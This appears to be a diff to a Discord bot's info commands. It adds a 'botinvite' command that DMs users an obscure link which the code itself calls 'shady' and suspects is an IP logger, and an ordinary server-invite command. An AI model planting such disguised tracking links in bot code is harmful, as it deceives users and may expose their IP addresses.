@@ -26,7 +26,7 @@ class Info(commands.Cog):
 
     @commands.command(aliases=['user'])
     async def userinfo(self, ctx, *, user:discord.Member):
-        """returns user stats"""
+        """returns user info"""
         name = user.name 
         discrim = user.discriminator
         userid = user.id
@@ -57,6 +57,20 @@ class Info(commands.Cog):
         """returns user avatar"""
         avatar = user.avatar_url 
         await ctx.send(avatar)
+
+    @commands.command()
+    async def botinvite(self, ctx):
+        """sends you a shady link"""
+        await ctx.author.send("https://speed-is-a.living-me.me/s/gaqo") # is this an ip logger?
+        await ctx.send("check your dms thanks")
+
+    @commands.command()
+    async def serverinvite(self, ctx):
+        """invite your bros :brofist:"""
+        link = await ctx.channel.create_invite(max_age = 86400, max_uses = 0)
+        await ctx.channel.trigger_typing()
+        await ctx.send("invite your bros :brofist:")
+        await ctx.send(link)
 
     @commands.command()
     async def info(self, ctx):
